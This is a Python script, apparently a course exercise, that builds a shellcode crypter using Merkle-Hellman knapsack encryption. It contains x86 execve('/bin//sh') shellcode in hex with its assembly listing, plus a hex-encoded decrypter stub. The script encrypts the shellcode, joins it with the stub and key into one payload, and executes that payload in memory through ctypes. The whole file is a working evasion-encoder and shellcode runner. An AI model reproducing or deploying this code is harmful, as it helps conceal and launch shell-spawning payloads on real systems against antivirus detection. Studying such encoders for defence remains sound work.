#!/usr/bin/python3

# Demey Alexandre
# Id : PA-14186
# Date : 12-05-2020
# Merkle-Hellman knapstack cryptosystem implementation
# https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem
from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import random
import math

libc = CDLL("libc.so.6")

# Execve("/bin//sh", null, null) 
shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
original_size = "\\x"+"{:02x}".format(int(len(shellcode) / 4))

#    xor ecx,ecx
#    mul ecx
#
#    push eax
#    push 0x68732f6e
#    push 0x69622f2f 
#
#    mov ebx, esp
#    mov al, 0x0b
#    int 0x80

# Merkle-Hellman crypter stub :
decrypter = "\\xeb\\x4d\\x66\\x8b\\x43\\x0a\\x66\\xf7\\x26\\x66\\xf7\\x73\\x08\\x66\\x89\\xd0\\xc3\\x5b\\x8d\\x7b\\x0c\\x89\\xfe\\x31\\xc9\\xf7\\xe1\\xb1{size}\\xe8\\xe0\\xff\\xff\\xff\\x66\\x51\\xb1\\x08\\x01\\xcb\\x4b\\x99\\x8a\\x13\\x66\\x39\\xd0\\xf8\\x78\\x04\\x66\\x29\\xd0\\xf9\\xd1\\xdd\\xfe\\xc9\\x75\\xec\\xc1\\xed\\x18\\x87\\xea\\x88\\x17\\x47\\x8d\\x76\\x02\\x66\\x59\\x66\\x49\\x75\\xd0\\xeb\\x11\\xe8\\xbd\\xff\\xff\\xff{pki}{encrypted}"

# Private and Public key generator
def mhk_keygen():
    # Generate a superincreasing sequence w where the bigger element is <= 255
    w = []
    w.append(random.randint(1,2))
    for i in range(0,7):
        s , j = 0, 2**i
        s += random.randint(1,2)
        for k in range (0, i+1):
            s += w[k]
        w.append(s)

    # Generate q and r
    s = sum(w)
    q = random.randint(s + 1, 4096)
    r = random.randint(1, q - 1)
    while math.gcd(q, r) != 1:
        r = random.randint(1, q -1)

    # The private key
    priv_key = (w, q, r)

    # Generate now the public key
    pub_key = []
    for i in w:
        pub_key.append((i*r) % q)

    return (priv_key, pub_key)


# Encrypt the shellcode, return a list of the encrypted bytes value.
def mhk_crypt(pub, shellcode):
    shellcode_b = bytes.fromhex(shellcode.replace('\\x',''))
    crypted = []
    for c in shellcode_b:
        i = 0
        c = "{:08b}".format(c)
        for b in range(0,8):
            i += int(c[b]) * pub[b]
        crypted.append(i)
    return crypted
    

# modinv and xgcd are taken from 
# https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm
def xgcd(a, b):
    """return (g, x, y) such that a*x + b*y = g = gcd(a, b)"""
    x0, x1, y0, y1 = 0, 1, 1, 0
    while a != 0:
        (q, a), b = divmod(b, a), a
        y0, y1 = y1, y0 - q * y1
        x0, x1 = x1, x0 - q * x1
    return b, x0, y0
def modinv(a, b):
    """return x such that (x * a) % b == 1"""
    g, x, _ = xgcd(a, b)
    if g != 1:
        raise Exception('gcd(a, b) != 1')
    return x % b


# Decrypt a crypted shellcode with the given private key
# return the shellcode string
# used to test the algo before coding it in assembly
def mhk_decrypt(priv, crypted):
    s = modinv(priv[2], priv[1])
    decrypted = ""
    for i in crypted:
        u = ""
        nb = i * s % priv[1]
        for n in range(7, -1, -1):
            if priv[0][n] <= nb:
                nb -= priv[0][n]
                u = '1' + u
            else:
                u = '0' + u
        decrypted += "\\x"+"{:02x}".format(int("0b"+u, base=2))
    return decrypted


# return a string representation of the encrypted shellcode
def mhk_cryptostr(shellcode):
    crypted_str = ""
    for i in shellcode:
        s = "{:04x}".format(i)
        s = "\\x"+s[2:]+"\\x"+s[:2]
        crypted_str += s
    return crypted_str

# I'm cheating, I don't calculate the modular inverse in asm
# But here, and I replace r with it
# So return a string representation of the private key (w, q, modinv_r)
def mhk_keytostr(pk):
    pk_s = ""
    for i in pk[0]:
        pk_s += "\\x"+"{:02x}".format(i)
    q, r = "{:04x}".format(pk[1]), "{:04x}".format(modinv(pk[2],pk[1]))
    pk_s += "\\x"+q[2:]+"\\x"+q[:2]+"\\x"+r[2:]+"\\x"+r[:2]
    return pk_s

# Generate the keys pair
keys = mhk_keygen()

# Encrypt the original shellcode 
crypted = mhk_crypt(keys[1], shellcode)
print("Encrypted shellcode ({} bytes):".format(len(crypted)*2))
crypted = mhk_cryptostr(crypted)
print(crypted, end="\n\n")

private_key = mhk_keytostr(keys[0])
print("Private key (12 bytes):")
print(private_key , end="\n\n")

# Initialize the stub :
decrypter = decrypter.format(size=original_size , pki=private_key, encrypted=crypted)

# Convert the decrypter stub and encrypted shellcode into a bytes object
payload_b = bytes.fromhex(decrypter.replace('\\x', ''))

print("Encrypted shellcode + Decrypter stub ({} bytes):".format(len(payload_b)))
print(decrypter, end="\n\n")


# Execute the payload
c_shell_p = c_char_p(payload_b)

launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

print("Running shellcode....")
launch()
